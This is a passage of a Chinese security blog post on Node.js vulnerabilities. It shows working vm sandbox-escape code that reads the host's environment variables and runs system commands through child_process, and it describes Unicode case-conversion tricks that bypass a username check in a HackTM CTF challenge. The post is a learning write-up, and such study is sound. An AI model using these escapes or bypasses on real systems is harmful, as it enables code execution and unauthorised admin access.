+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">&quot;this.constructor.constructor(&#x27;return this.process.env&#x27;)()&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.createContext(sandbox);</span><br><span class="line">env = script.runInContext(context);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>
+
+<p>创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</p>
+<p>因为<code>this.constructor.constructor</code>返回的是一个<code>Function constructor</code>，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是<code>return this.process.env</code>，结果是返回了主程序的环境变量。</p>
+<p>配合<code>chile_process.exec()</code>就可以执行任意命令了：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor(&#x27;return this.process&#x27;)();</span></span><br><span class="line"><span class="string">process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>
+
+<p>最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。</p>
+<p>具体分析可参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7056">CVE-2019-10758:mongo-expressRCE复现分析</a></p>
+<h2 id="javascript大小写特性"><a href="#javascript大小写特性" class="headerlink" title="javascript大小写特性"></a>javascript大小写特性</h2><p>在javascript中有几个特殊的字符需要记录一下</p>
+<p>对于toUpperCase():</p>
+<pre><code>字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</code></pre>
+<p>对于toLowerCase():</p>
+<pre><code>字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</code></pre>
+<p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p>
+<p><strong>CTF题实例 - Hacktm中的一道Nodejs题</strong></p>
+<p>题目部分源码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidUser</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.username.length &gt;= <span class="number">3</span> &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> u.username.toLowerCase() == config.adminUsername.toLowerCase();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解题时需要登录管理员的用户名，但是在登录时，<code>isValidUser</code>函数会对用户输入的用户名进行<code>toUpperCase</code>处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。</p>
+<p>但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是<code>toLowerCase</code>。所以这两个差异，就可以使用大小写特性来进行绕过。</p>
+<p>题目中默认的管理员用户名为：hacktm</p>
+<p>所以，我们指定登录时的用户名为：hacKtm 即可绕过<code>isValidUser</code>和<code>isAdmin</code>的验证。</p>
+<p>题目完整Writeup：</p>
+<h2 id="说在最后"><a href="#说在最后" class="headerlink" title="说在最后"></a>说在最后</h2><p>最近才刚开始学习Node.js，打算趁寒假这段时间把常见的几个漏洞总结一下。如果文章中出现了错误，还希望师傅们能够直接指出来，十分感谢！</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/152891.html">浅谈Node.js Web的安全问题</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/200406.html">深入理解JavaScript Prototype污染攻击</a></li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/213/">利用 Node.js 反序列化漏洞远程执行代码</a></li>
+<li><a target="_blank" rel="noopener" href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html">Sandboxing NodeJS is hard, here is why</a></li>
+<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000012672620">https://segmentfault.com/a/1190000012672620</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">Fuzz中的javascript大小写特性</a></li>
+</ul>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
